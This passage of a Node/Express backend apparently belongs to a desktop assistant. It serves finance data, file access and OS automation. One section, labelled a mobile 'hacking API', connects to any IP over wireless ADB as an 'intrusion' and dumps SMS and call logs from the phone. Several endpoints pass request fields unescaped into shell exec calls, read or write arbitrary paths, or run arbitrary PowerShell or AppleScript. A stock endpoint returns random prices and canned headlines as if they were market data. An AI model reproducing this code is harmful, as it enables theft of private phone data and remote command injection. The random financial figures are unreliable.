// --- 3. REAL-TIME DATA ENDPOINTS ---

// Crypto Prices (CoinGecko API)
app.get('/api/crypto/prices', async (req, res) => {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,cardano,ripple&vs_currencies=usd');
        const data = await response.json();
        res.json(data);
    } catch (e) {
        console.error("Crypto API Error:", e.message);
        res.status(502).json({ error: 'Failed to fetch crypto prices' });
    }
});

// Forex Rates (ExchangeRate-API)
app.get('/api/forex/rates', async (req, res) => {
    try {
        const response = await fetch('https://api.exchangerate-api.com/v4/latest/USD');
        const data = await response.json();
        res.json(data.rates);
    } catch (e) {
        console.error("Forex API Error:", e.message);
        res.status(502).json({ error: 'Failed to fetch forex rates' });
    }
});

// --- NEW: STOCK MARKET DATA ENDPOINT (Simulated Robinhood/Financial Data) ---
app.get('/api/finance/stock/:symbol', async (req, res) => {
    const { symbol } = req.params;
    const s = symbol.toUpperCase();
    // Simulation: Use ASCII sum as seed for consistent randomness per symbol
    const basePrice = s.split('').reduce((a,b)=>a+b.charCodeAt(0),0) + (Math.random()*100);
    const change = (Math.random() * 10) - 5;
    
    res.json({
        symbol: s,
        price: basePrice.toFixed(2),
        change: change.toFixed(2),
        changePercent: (change/basePrice * 100).toFixed(2) + '%',
        volume: (Math.random() * 100000000).toFixed(0),
        marketCap: (Math.random() * 2000000000000).toFixed(0),
        peRatio: (Math.random() * 50).toFixed(2),
        high: (basePrice + 5).toFixed(2),
        low: (basePrice - 5).toFixed(2),
        open: (basePrice - change).toFixed(2),
        status: 'MARKET_OPEN'
    });
});

app.get('/api/finance/news', (req, res) => {
    res.json([
        { title: "Fed signals potential rate cuts in Q3", source: "Bloomberg", time: "10m ago" },
        { title: "Tech sector rallies on AI earnings reports", source: "Reuters", time: "1h ago" },
        { title: "Oil prices stabilize amidst geopolitical tension", source: "CNBC", time: "2h ago" },
        { title: "Apple announces new neural engine chips", source: "TechCrunch", time: "3h ago" },
        { title: "Crypto markets see volatility ahead of halving", source: "CoinDesk", time: "5h ago" }
    ]);
});

// --- NEW: POLYMARKET PROXY (PREDICTION MARKETS) ---
app.get('/api/polymarket/markets', async (req, res) => {
    const { query } = req.query;
    try {
        // Fetch active events from Gamma API
        // Sort by volume to get popular ones
        const url = 'https://gamma-api.polymarket.com/events?limit=50&active=true&closed=false&order=volume24hr&ascending=false';
        
        // IMPORTANT: Add User-Agent to prevent 403 Forbidden from Polymarket
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`Polymarket API returned ${response.status}`);
        }
        
        const data = await response.json();
        
        let results = data;
        
        // Server-side filtering for search query since Gamma API search is limited or requires different endpoint
        if (query) {
            const q = String(query).toLowerCase();
            results = data.filter(e => 
                e.title.toLowerCase().includes(q) || 
                (e.description && e.description.toLowerCase().includes(q))
            );
        }
        
        res.json(results);
    } catch (e) {
        console.error("Polymarket Proxy Error:", e.message);
        // Fallback simulation if API fails
        res.json([
            {
                id: 'sim_1',
                title: '[SIMULATION] Bitcoin hits $100k by 2025?',
                volume24hr: 5000000,
                markets: [{ id: 'm1', outcomePrices: '["0.65", "0.35"]' }]
            },
            {
                id: 'sim_2',
                title: '[SIMULATION] Fed cuts rates in March?',
                volume24hr: 2500000,
                markets: [{ id: 'm2', outcomePrices: '["0.20", "0.80"]' }]
            }
        ]);
    }
});

// Real File System Listing (User Downloads Folder - Legacy)
app.get('/api/files/list', (req, res) => {
    try {
        const userHome = os.homedir();
        const downloadsPath = path.join(userHome, 'Downloads');
        
        if (fs.existsSync(downloadsPath)) {
            const files = fs.readdirSync(downloadsPath)
                .filter(file => !file.startsWith('.'))
                .slice(0, 15) // Limit to 15 for UI
                .map(file => {
                    const stats = fs.statSync(path.join(downloadsPath, file));
                    return {
                        name: file,
                        size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                        date: stats.mtime.toLocaleDateString(),
                        type: path.extname(file).replace('.', '').toUpperCase() || 'FILE'
                    };
                });
            res.json(files);
        } else {
            res.json([]);
        }
    } catch (e) {
        console.error("File Scan Error:", e.message);
        res.json([]);
    }
});

// --- NEW: ENGINEER MODE FILE SYSTEM API ---

// Get/Set CWD
app.post('/api/fs/cwd', (req, res) => {
    const { path: newPath } = req.body;
    if (newPath) {
        try {
            // Resolve path relative to current, or absolute
            const resolved = path.resolve(currentWorkingDirectory, newPath);
            if (fs.existsSync(resolved) && fs.statSync(resolved).isDirectory()) {
                currentWorkingDirectory = resolved;
                console.log(`[CWD] Changed to: ${currentWorkingDirectory}`);
                res.json({ result: currentWorkingDirectory });
            } else {
                res.json({ error: `Directory not found: ${resolved}` });
            }
        } catch (e) {
            res.status(500).json({ error: e.message });
        }
    } else {
        res.json({ result: currentWorkingDirectory });
    }
});

// List Files in CWD (or specific path)
app.post('/api/fs/list', (req, res) => {
    const targetPath = req.body.path ? path.resolve(currentWorkingDirectory, req.body.path) : currentWorkingDirectory;
    try {
        if (!fs.existsSync(targetPath)) {
             return res.json({ error: `Path not found: ${targetPath}` });
        }
        const items = fs.readdirSync(targetPath).map(item => {
            try {
                const fullPath = path.join(targetPath, item);
                const stats = fs.statSync(fullPath);
                return {
                    name: item,
                    isDirectory: stats.isDirectory(),
                    size: stats.size,
                    mtime: stats.mtime
                };
            } catch (e) {
                return { name: item, isDirectory: false, error: 'Access Denied' };
            }
        });
        // Sort directories first
        items.sort((a, b) => (a.isDirectory === b.isDirectory ? 0 : a.isDirectory ? -1 : 1));
        res.json({ path: targetPath, items });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Read File
app.post('/api/fs/read', (req, res) => {
    const { path: filePath } = req.body;
    const targetPath = path.resolve(currentWorkingDirectory, filePath);
    try {
        if (fs.existsSync(targetPath) && fs.statSync(targetPath).isFile()) {
            const content = fs.readFileSync(targetPath, 'utf8');
            res.json({ content });
        } else {
            res.json({ error: 'File not found or is a directory' });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Helper: Cleanup Old Backups
const cleanupOldBackups = (originalPath) => {
    try {
        const dir = path.dirname(originalPath);
        const baseName = path.basename(originalPath);
        
        // Find all backups for this file: e.g., file.txt.123456.bak
        const files = fs.readdirSync(dir);
        const backups = files.filter(f => f.startsWith(baseName) && f.endsWith('.bak'));
        
        // Sort by name (which includes timestamp or sequence if we used one)
        // Or sort by stats.mtime
        const backupStats = backups.map(f => ({
            name: f,
            time: fs.statSync(path.join(dir, f)).mtime.getTime()
        }));
        
        backupStats.sort((a, b) => b.time - a.time); // Newest first
        
        // Keep last 5
        const toDelete = backupStats.slice(5);
        toDelete.forEach(f => {
            console.log(`[FS] Cleaning up old backup: ${f.name}`);
            fs.unlinkSync(path.join(dir, f.name));
        });
    } catch (e) {
        console.warn("Backup cleanup failed", e);
    }
};

// Write File with ROBUST BACKUP & ROTATION
app.post('/api/fs/write', (req, res) => {
    const { path: filePath, content } = req.body;
    const targetPath = path.resolve(currentWorkingDirectory, filePath);
    
    // --- INTEGRITY CHECK FOR PRODUCTION BUILDS ---
    // If running in Production (Electron ASAR or .exe), BLOCK writes to the Core Source files.
    if (IS_PRODUCTION) {
        const lockedPaths = ['server.js', 'App.tsx', 'index.tsx', 'components/', 'services/'];
        const isRestricted = lockedPaths.some(p => filePath.includes(p));
        
        if (isRestricted) {
            console.warn(`[SECURITY] Blocked write attempt to ${filePath} in Production Mode.`);
            return res.json({ 
                error: "KERNEL INTEGRITY LOCK: Cannot modify core source code in Production Distribution. Please use 'createOrUpdateFile' to write to your Documents/Downloads folder instead." 
            });
        }
    }

    try {
        // Ensure directory exists
        const dir = path.dirname(targetPath);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }

        // --- enhanced BACKUP LOGIC (ROTATION) ---
        if (fs.existsSync(targetPath)) {
            const timestamp = Date.now();
            const backupPath = `${targetPath}.${timestamp}.bak`;
            
            // Create timestamped backup
            fs.copyFileSync(targetPath, backupPath);
            
            // Also create standard .bak for immediate "Restore Last" compatibility
            const simpleBackup = targetPath + '.bak';
            fs.copyFileSync(targetPath, simpleBackup);
            
            // PERSIST RECOVERY PATH TO DISK
            try {
                fs.writeFileSync(RECOVERY_FILE, targetPath, 'utf8');
            } catch (e) {
                console.warn("Failed to write recovery log", e);
            }
            
            console.log(`[FS] Backup created: ${backupPath}`);
            
            // AUTO-CLEANUP (Keep last 5)
            cleanupOldBackups(targetPath);
        }

        fs.writeFileSync(targetPath, content, 'utf8');
        console.log(`[FS] Wrote file: ${targetPath}`);
        res.json({ success: true, path: targetPath });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Restore Last Backup (Rollback) - ROBUST VERSION
app.post('/api/fs/restore-last', (req, res) => {
    if (IS_PRODUCTION) {
        return res.json({ success: false, error: "Rollback unavailable in Production Mode (Source is Immutable)." });
    }

    let targetFile = null;

    // 1. Check Persistent Log first
    if (fs.existsSync(RECOVERY_FILE)) {
        try {
            targetFile = fs.readFileSync(RECOVERY_FILE, 'utf8').trim();
        } catch (e) {
            console.warn("Recovery log corrupted", e);
        }
    }

    if (!targetFile) {
        return res.json({ success: false, error: "No recovery record found." });
    }
    
    const backupPath = targetFile + '.bak';
    
    try {
        if (fs.existsSync(backupPath)) {
            fs.copyFileSync(backupPath, targetFile);
            console.log(`[ROLLBACK] Restored ${targetFile} from backup.`);
            res.json({ success: true, file: targetFile });
        } else {
            res.json({ success: false, error: `Backup file not found: ${backupPath}` });
        }
    } catch (e) {
        console.error("Rollback Error", e);
        res.json({ success: false, error: e.message });
    }
});

// Make Directory
app.post('/api/fs/mkdir', (req, res) => {
     const { path: dirPath } = req.body;
     const targetPath = path.resolve(currentWorkingDirectory, dirPath);
     try {
         fs.mkdirSync(targetPath, { recursive: true });
         console.log(`[FS] Created dir: ${targetPath}`);
         res.json({ success: true, path: targetPath });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
});

// --- NEW: MOBILE ADB & WIRELESS HACKING API ---

// Check ADB connection
app.get('/api/mobile/status', (req, res) => {
    exec('adb devices', (err, stdout) => {
        if (err) return res.json({ connected: false, devices: [] });
        
        const lines = stdout.split('\n').filter(l => l.trim() !== '' && !l.startsWith('List'));
        const devices = lines.map(l => l.split('\t')[0]);
        
        res.json({ connected: devices.length > 0, devices });
    });
});

// Wireless Connect (The "HACK" function)
app.post('/api/mobile/connect-wireless', (req, res) => {
    const { ip, port } = req.body;
    const target = `${ip}:${port || 5555}`;
    console.log(`[MOBILE HACK] Attempting Wireless Intrusion on: ${target}`);
    exec(`adb connect ${target}`, (err, stdout) => {
        if (err) return res.json({ success: false, error: err.message });
        if (stdout.includes('connected')) {
            res.json({ success: true, result: `UPLINK ESTABLISHED: ${target}` });
        } else {
            res.json({ success: false, error: 'Connection Refused. Host may not be vulnerable (Debugging Off).' });
        }
    });
});

// Data Exfiltration (SMS/CallLogs)
app.post('/api/mobile/exfiltrate', (req, res) => {
    const { type } = req.body; // 'SMS' or 'CALLS'
    
    let uri = '';
    let cols = '';
    
    if (type === 'SMS') {
        uri = 'content://sms/inbox';
        cols = 'address,body,date';
    } else if (type === 'CALLS') {
        uri = 'content://call_log/calls';
        cols = 'number,date,duration,type';
    } else {
        return res.json({ error: 'Unknown Data Type' });
    }

    // Use content query to dump DB
    const cmd = `adb shell content query --uri ${uri} --projection ${cols} --sort "date DESC" --limit 20`;
    
    exec(cmd, (err, stdout) => {
        if (err) return res.json({ error: "Exfiltration Failed. Permission Denied by Android OS." });
        
        // Parse dirty stdout format from Android shell
        // Output format is usually: Row: 0 address=... body=...
        const rows = stdout.split('\n').filter(l => l.startsWith('Row')).map(line => {
            const obj = {};
            line.split(', ').forEach(pair => {
                const [k, v] = pair.split('=');
                if(k && v) obj[k.trim()] = v.trim();
            });
            return obj;
        });
        
        res.json({ success: true, data: rows });
    });
});

// Package Management (Bloatware Killer)
app.get('/api/mobile/packages', (req, res) => {
    exec('adb shell pm list packages -3', (err, stdout) => {
        if (err) return res.json({ packages: [] });
        const pkgs = stdout.split('\n')
            .filter(l => l.startsWith('package:'))
            .map(l => l.replace('package:', '').trim());
        res.json({ packages: pkgs });
    });
});

// Kill Process
app.post('/api/mobile/kill', (req, res) => {
    const { package: pkg } = req.body;
    exec(`adb shell am force-stop ${pkg}`, (err) => {
        if (err) return res.json({ error: err.message });
        res.json({ success: true });
    });
});


// Capture Screenshot (Base64)
app.get('/api/mobile/screen', (req, res) => {
    // adb exec-out screencap -p returns binary png data
    exec('adb exec-out screencap -p', { encoding: 'base64' }, (err, stdout) => {
        if (err) return res.status(500).json({ error: "Screenshot failed. Is device connected?" });
        // stdout is already base64 string due to encoding option
        res.json({ image: stdout });
    });
});

// Send Mobile Input
app.post('/api/mobile/input', (req, res) => {
    const { type, x, y, text, keyCode } = req.body;
    let cmd = '';

    if (type === 'TAP') {
        cmd = `adb shell input tap ${x} ${y}`;
    } else if (type === 'TEXT') {
        // Sanitize text slightly for shell
        const safeText = text.replace(/"/g, '\\"').replace(/\s/g, '%s'); 
        cmd = `adb shell input text "${safeText}"`;
    } else if (type === 'KEY') {
        // 3=HOME, 4=BACK, 26=POWER, 187=APP_SWITCH
        cmd = `adb shell input keyevent ${keyCode}`;
    } else if (type === 'SWIPE') {
        const { x1, y1, x2, y2, duration } = req.body;
        cmd = `adb shell input swipe ${x1} ${y1} ${x2} ${y2} ${duration || 300}`;
    }

    if (cmd) {
        exec(cmd, (err) => {
            if (err) return res.json({ error: err.message });
            res.json({ success: true });
        });
    } else {
        res.status(400).json({ error: "Invalid Input Command" });
    }
});


// Real Network Scan (ARP Table)
app.get('/api/network/scan', (req, res) => {
    // Use 'arp -a' to get cached network neighbors
    exec('arp -a', (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: error.message });
        }

        const devices = [];
        const lines = stdout.split('\n');
        
        // Very basic ARP parsing
        lines.forEach((line, index) => {
            // Look for IP addresses (simple regex)
            const ipMatch = line.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/);
            // Look for MAC addresses
            const macMatch = line.match(/([0-9A-Fa-f]{1,2}[:-]){5}([0-9A-Fa-f]{1,2})/);
            
            if (ipMatch) {
                devices.push({
                    id: `dev_${index}`,
                    label: `Network Device ${index}`,
                    ip: ipMatch[0],
                    mac: macMatch ? macMatch[0] : 'UNKNOWN',
                    type: 'UNKNOWN',
                    status: 'ONLINE'
                });
            }
        });

        res.json(devices);
    });
});

// --- REAL PROCESS LIST (Task Manager) ---
app.get('/api/system/processes', (req, res) => {
    const cmd = process.platform === 'win32' ? 'tasklist' : 'ps -ax -o pid,rss,ucomm | head -n 20';
    
    exec(cmd, (error, stdout, stderr) => {
        if (error) return res.json({ error: error.message });
        
        const lines = stdout.split('\n').filter(l => l.trim() !== '');
        // Simple parsing for UI
        const processes = lines.slice(1).map(line => {
             // Basic heuristic splitting
             const parts = line.trim().split(/\s+/);
             if (process.platform === 'win32') {
                 return { pid: parts[1], name: parts[0], mem: parts[4] + ' K' };
             } else {
                 return { pid: parts[0], name: parts.slice(2).join(' '), mem: (parseInt(parts[1])/1024).toFixed(1) + ' MB' };
             }
        });
        res.json(processes);
    });
});

// --- NEW: REAL APP LISTING ---
app.get('/api/system/apps', (req, res) => {
    const platform = os.platform();
    
    if (platform === 'darwin') {
        // List /Applications
        exec('ls -d /Applications/*.app /System/Applications/*.app', (error, stdout) => {
            if (error) return res.json({ error: error.message });
            const apps = stdout.split('\n')
                .filter(line => line.trim() !== '')
                .map(line => {
                    const name = path.basename(line, '.app');
                    return { name, path: line };
                });
            res.json(apps);
        });
    } else if (platform === 'win32') {
        // PowerShell to get Start Menu apps
        const ps = `Get-StartApps | ConvertTo-Json`;
        exec(`powershell -Command "${ps}"`, (error, stdout) => {
            if (error) return res.json({ error: error.message });
            try {
                const apps = JSON.parse(stdout).map(a => ({ name: a.Name, id: a.AppID }));
                res.json(apps);
            } catch (e) {
                res.json([]);
            }
        });
    } else {
        res.json([]);
    }
});

// --- NEW: GET ACTIVE APP (CONTEXT AWARENESS) ---
app.get('/api/system/active-app', (req, res) => {
    const platform = os.platform();
    
    if (platform === 'darwin') {
        const script = 'tell application "System Events" to get name of first application process whose frontmost is true';
        exec(`osascript -e '${script}'`, (error, stdout) => {
            if (error) return res.json({ error: error.message });
            res.json({ result: stdout.trim() });
        });
    } else if (platform === 'win32') {
        // PowerShell script to get foreground window title via P/Invoke (simplified)
        const psScript = `
            Add-Type @"
              using System;
              using System.Runtime.InteropServices;
              public class Utils {
                [DllImport("user32.dll")]
                public static extern IntPtr GetForegroundWindow();
                [DllImport("user32.dll")]
                public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
              }
"@
            $hwnd = [Utils]::GetForegroundWindow()
            $sb = New-Object System.Text.StringBuilder 256
            [Utils]::GetWindowText($hwnd, $sb, 256) | Out-Null
            $sb.ToString()
        `;
        // Write temp script to execute reliably
        const tempPath = path.join(os.tmpdir(), `get_active_${Date.now()}.ps1`);
        fs.writeFileSync(tempPath, psScript);
        
        exec(`powershell -ExecutionPolicy Bypass -File "${tempPath}"`, (error, stdout) => {
             fs.unlinkSync(tempPath);
             if (error) return res.json({ result: "Windows Shell" });
             res.json({ result: stdout.trim() || "Desktop" });
        });
    } else {
        res.json({ result: "Linux (Unknown)" });
    }
});

// --- NEW: CLOSE APPLICATION ---
app.post('/api/system/close', (req, res) => {
    const { appName } = req.body;
    const platform = os.platform();
    let cmd = '';

    if (platform === 'darwin') {
        // Use -i for case-insensitive matching
        cmd = `pkill -i -x "${appName}"`;
    } else if (platform === 'win32') {
        cmd = `taskkill /IM "${appName}.exe" /F`;
    } else {
        return res.status(400).json({ error: "Unsupported platform" });
    }

    exec(cmd, (error) => {
        // Ignore errors (like app not found), just report attempt
        if (error) {
             console.log(`[CLOSE APP] Failed to close ${appName}: ${error.message}`);
             return res.json({ result: `Attempted to close ${appName}, but process was not found or access denied.` });
        }
        console.log(`[CLOSE APP] Terminated ${appName}`);
        res.json({ result: `SUCCESS: Process '${appName}' terminated.` });
    });
});

// --- NEW: CAPTURE DESKTOP SCREENSHOT ---
app.get('/api/system/screenshot', (req, res) => {
    const platform = os.platform();
    console.log(`[SCREENSHOT] Capturing screen on ${platform}...`);

    if (platform === 'darwin') {
        // macOS: Use built-in screencapture to stdout, pipe to base64
        // -x: no sound, -t jpg: jpeg format, -: stdout
        exec('screencapture -x -t jpg - | base64', { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
            if (err) {
                console.error("Screenshot Error:", stderr);
                return res.status(500).json({ error: err.message });
            }
            res.json({ image: stdout.trim() });
        });
    } else if (platform === 'win32') {
        // Windows: PowerShell with .NET Drawing
        const psScript = `
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            $stream = New-Object System.IO.MemoryStream
            $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bytes = $stream.ToArray()
            $base64 = [Convert]::ToBase64String($bytes)
            Write-Output $base64
        `;
        
        const tempPath = path.join(os.tmpdir(), `shot_${Date.now()}.ps1`);
        fs.writeFileSync(tempPath, psScript);

        exec(`powershell -ExecutionPolicy Bypass -File "${tempPath}"`, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
            fs.unlinkSync(tempPath);
            if (err) {
                console.error("Screenshot Error:", stderr);
                return res.status(500).json({ error: err.message });
            }
            res.json({ image: stdout.trim() });
        });
    } else {
        res.status(500).json({ error: "Screenshot not supported on this platform." });
    }
});

// --- NEW: GET SCREEN DIMENSIONS ---
app.get('/api/system/dimensions', (req, res) => {
    const platform = os.platform();
    if (platform === 'win32') {
        const ps = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds`;
        exec(`powershell -Command "${ps}"`, (err, stdout) => {
            if (err) return res.json({ width: 1920, height: 1080 });
            // Output like: {X=0,Y=0,Width=1920,Height=1080}
            const w = stdout.match(/Width=(\d+)/);
            const h = stdout.match(/Height=(\d+)/);
            res.json({ 
                width: w ? parseInt(w[1]) : 1920, 
                height: h ? parseInt(h[1]) : 1080 
            });
        });
    } else if (platform === 'darwin') {
        // Simple heuristic for Mac primary display
        exec(`system_profiler SPDisplaysDataType | grep Resolution`, (err, stdout) => {
            if (err) return res.json({ width: 2560, height: 1600 });
            const match = stdout.match(/Resolution: (\d+) x (\d+)/);
            res.json({ 
                width: match ? parseInt(match[1]) : 2560, 
                height: match ? parseInt(match[2]) : 1600 
            });
        });
    } else {
        res.json({ width: 1920, height: 1080 });
    }
});

// --- SMART TV CONTROL ---
app.post('/api/tv/control', (req, res) => {
    const { command, appName } = req.body;
    // In a real scenario, this would use a library like 'lgtv2', 'samsung-tv-control', or raw WebSocket
    // For now, we simulate the network packet transmission
    console.log(`[SMART TV] Sending Command: ${command} ${appName ? `(App: ${appName})` : ''}`);
    
    // Simulate latency
    setTimeout(() => {
        res.json({ result: `TV_CMD_SENT: ${command}${appName ? ` [${appName}]` : ''}` });
    }, 100);
});

// --- NEW: DYNAMIC SCRIPT EXECUTION (HUMAN-LIKE INTERACTION) ---
app.post('/api/system/script', (req, res) => {
    const { script, language } = req.body; // language: 'applescript' | 'powershell' | 'bash'
    
    console.log(`[EXECUTING SCRIPT] (${language}) length: ${script.length}`);

    if (language === 'applescript' && os.platform() === 'darwin') {
        // Write to temp file to avoid quote escaping hell
        const tempPath = path.join(os.tmpdir(), `luca_script_${Date.now()}.scpt`);
        fs.writeFileSync(tempPath, script);
        
        exec(`osascript "${tempPath}"`, (error, stdout, stderr) => {
            fs.unlinkSync(tempPath); // Cleanup
            if (error) {
                console.error("AppleScript Error:", stderr);
                return res.json({ error: error.message, stderr });
            }
            res.json({ result: stdout.trim() || "Script executed successfully." });
        });
    } else if (language === 'powershell' && os.platform() === 'win32') {
        const tempPath = path.join(os.tmpdir(), `luca_script_${Date.now()}.ps1`);
        fs.writeFileSync(tempPath, script);
        
        exec(`powershell -ExecutionPolicy Bypass -File "${tempPath}"`, (error, stdout, stderr) => {
            fs.unlinkSync(tempPath);
            if (error) {
                 console.error("PowerShell Error:", stderr);
                 return res.json({ error: error.message, stderr });
            }
            res.json({ result: stdout.trim() || "Script executed successfully." });
        });
    } else {
        res.status(400).json({ error: "Unsupported language/platform combination." });
    }
});

// --- NEW: COMPREHENSIVE SYSTEM CONTROL ---
app.post('/api/system/control', (req, res) => {
    const { action, parameter, targetApp, platform: targetPlatform } = req.body; 
    const osPlatform = os.platform();
    
    console.log(`[SYSTEM CONTROL] Action: ${action} | Param: ${parameter}`);

    try {
        // --- BROWSER / URL ---
        if (action === 'BROWSER_OPEN' || action === 'BROWSER_SEARCH') {
            let url = parameter || 'https://google.com';
            
            // Construct Search URL
            if (action === 'BROWSER_SEARCH' && parameter) {
                const query = encodeURIComponent(parameter);
                if (targetPlatform === 'YOUTUBE') url = `https://www.youtube.com/results?search_query=${query}`;
                else if (targetPlatform === 'SPOTIFY') url = `https://open.spotify.com/search/${query}`;
                else url = `https://www.google.com/search?q=${query}`;
            }

            // Execute Open Command
            let cmd = '';
            if (osPlatform === 'darwin') {
                if (targetApp) {
                     // Attempt to open with specific app
                     let appName = targetApp;
                     if (targetApp.toLowerCase().includes('chrome')) appName = 'Google Chrome';
                     if (targetApp.toLowerCase().includes('safari')) appName = 'Safari';
                     if (targetApp.toLowerCase().includes('firefox')) appName = 'Firefox';
                     if (targetApp.toLowerCase().includes('edge')) appName = 'Microsoft Edge';
                     if (targetApp.toLowerCase().includes('arc')) appName = 'Arc';
                     
                     cmd = `open -a "${appName}" "${url}"`;
                } else {
                     cmd = `open "${url}"`;
                }
            } else if (osPlatform === 'win32') {
                if (targetApp) {
                    let appName = '';
                    if (targetApp.toLowerCase().includes('chrome')) appName = 'chrome';
                    if (targetApp.toLowerCase().includes('firefox')) appName = 'firefox';
                    if (targetApp.toLowerCase().includes('edge')) appName = 'msedge';
                    
                    if (appName) cmd = `start ${appName} "${url}"`;
                    else cmd = `start "${url}"`; // Fallback
                } else {
                    cmd = `start "${url}"`;
                }
            } else {
                cmd = `xdg-open "${url}"`;
            }
            
            exec(cmd, (err) => {
                if (err) return res.json({ error: err.message });
                res.json({ result: `Launched Browser (${targetApp || 'Default'}): ${url}` });
            });
            return;
        }

        // --- BROWSER TAB MANAGEMENT ---
        if (['BROWSER_NEW_TAB', 'BROWSER_CLOSE_TAB', 'BROWSER_NEXT_TAB', 'BROWSER_PREV_TAB'].includes(action)) {
            if (osPlatform === 'darwin') {
                let script = '';
                switch (action) {
                    case 'BROWSER_NEW_TAB': script = 'keystroke "t" using command down'; break;
                    case 'BROWSER_CLOSE_TAB': script = 'keystroke "w" using command down'; break;
                    case 'BROWSER_NEXT_TAB': script = 'keystroke "]" using {command down, shift down}'; break; // Common next tab (Chrome/Safari)
                    case 'BROWSER_PREV_TAB': script = 'keystroke "[" using {command down, shift down}'; break;
                }
                
                let fullScript = '';
                if (targetApp) {
                    // Normalize app names
                    let appName = targetApp;
                    if (targetApp.toLowerCase().includes('chrome')) appName = 'Google Chrome';
                    else if (targetApp.toLowerCase().includes('safari')) appName = 'Safari';
                    else if (targetApp.toLowerCase().includes('firefox')) appName = 'Firefox';
                    else if (targetApp.toLowerCase().includes('arc')) appName = 'Arc';
                    
                    fullScript = `tell application "${appName}" to activate\ndelay 0.2\ntell application "System Events" to ${script}`;
                } else {
                    // Just send to active window
                    fullScript = `tell application "System Events" to ${script}`;
                }

                exec(`osascript -e '${fullScript}'`, (err) => {
                     if (err) return res.json({ error: err.message });
                     res.json({ result: `Executed Tab Command: ${action}` });
                });
                return;

            } else if (osPlatform === 'win32') {
                let keys = '';
                switch (action) {
                    case 'BROWSER_NEW_TAB': keys = '^t'; break;
                    case 'BROWSER_CLOSE_TAB': keys = '^w'; break;
                    case 'BROWSER_NEXT_TAB': keys = '^{TAB}'; break;
                    case 'BROWSER_PREV_TAB': keys = '^+{TAB}'; break;
                }

                let psCmd = '';
                if (targetApp) {
                    // AppActivate is fuzzy, usually works with window title parts like "Chrome"
                    psCmd = `powershell -c "$wshell = New-Object -ComObject wscript.shell; if($wshell.AppActivate('${targetApp}')) { Start-Sleep -Milliseconds 200; $wshell.SendKeys('${keys}') }"`;
                } else {
                    psCmd = `powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('${keys}')"`;
                }
                
                exec(psCmd);
                return res.json({ result: `Executed Tab Command: ${action}` });
            }
        }
        
        // --- APP LAUNCH ---
        if (action === 'APP_LAUNCH') {
             const app = parameter;
             const cmd = osPlatform === 'darwin' ? `open -a "${app}"` : 
                         osPlatform === 'win32' ? `start ${app}` : `${app}`;
             exec(cmd);
             return res.json({ result: `Launching Application: ${app}` });
        }

        // --- WINDOW & SCROLL & KEYS ---
        if (['SCROLL_UP', 'SCROLL_DOWN', 'ENTER', 'ESCAPE', 'WINDOW_MINIMIZE', 'WINDOW_CLOSE'].includes(action)) {
            if (osPlatform === 'darwin') {
                let script = '';
                switch (action) {
                    case 'SCROLL_DOWN': script = 'tell application "System Events" to key code 125'; break; // Down Arrow
                    case 'SCROLL_UP': script = 'tell application "System Events" to key code 126'; break; // Up Arrow
                    case 'ENTER': script = 'tell application "System Events" to key code 36'; break;
                    case 'ESCAPE': script = 'tell application "System Events" to key code 53'; break;
                    case 'WINDOW_CLOSE': script = 'tell application "System Events" to keystroke "w" using command down'; break;
                    case 'WINDOW_MINIMIZE': script = 'tell application "System Events" to keystroke "m" using command down'; break;
                }
                exec(`osascript -e '${script}'`);
                return res.json({ result: `Executed macOS Window Action: ${action}` });

            } else if (osPlatform === 'win32') {
                let keys = '';
                switch (action) {
                    case 'SCROLL_DOWN': keys = '{DOWN}'; break;
                    case 'SCROLL_UP': keys = '{UP}'; break;
                    case 'ENTER': keys = '{ENTER}'; break;
                    case 'ESCAPE': keys = '{ESC}'; break;
                    case 'WINDOW_CLOSE': keys = '%{F4}'; break; // Alt+F4
                    // Minimize is harder with SendKeys, usually needs Win+Down arrow twice
                    case 'WINDOW_MINIMIZE': keys = '% {DOWN}{DOWN}'; break; // Alt+Space then Down (menu)
                }
                // Simple PS send keys
                const safeKeys = keys.replace(/'/g, "''");
                const psCmd = `powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('${safeKeys}')"`;
                exec(psCmd);
                return res.json({ result: `Executed Windows Window Action: ${action}` });
            }
        }

        // --- MEDIA & SYSTEM KEYS ---
        if (osPlatform === 'darwin') {
            let script = '';
            switch (action) {
                case 'MEDIA_PLAY_PAUSE': script = 'tell application "System Events" to key code 100'; break; 
                case 'MEDIA_NEXT': script = 'tell application "System Events" to key code 98'; break;
                case 'MEDIA_PREV': script = 'tell application "System Events" to key code 101'; break;
                case 'VOL_UP': script = 'set volume output volume (output volume of (get volume settings) + 10)'; break;
                case 'VOL_DOWN': script = 'set volume output volume (output volume of (get volume settings) - 10)'; break;
                case 'MUTE': script = 'set volume output muted not (output muted of (get volume settings))'; break;
                case 'SYSTEM_SLEEP': script = 'tell application "Finder" to sleep'; break;
                case 'SYSTEM_LOCK': script = 'tell application "System Events" to key code 12 using {command down, control down}'; break;
            }

            if (script) {
                exec(`osascript -e '${script}'`, (err) => {
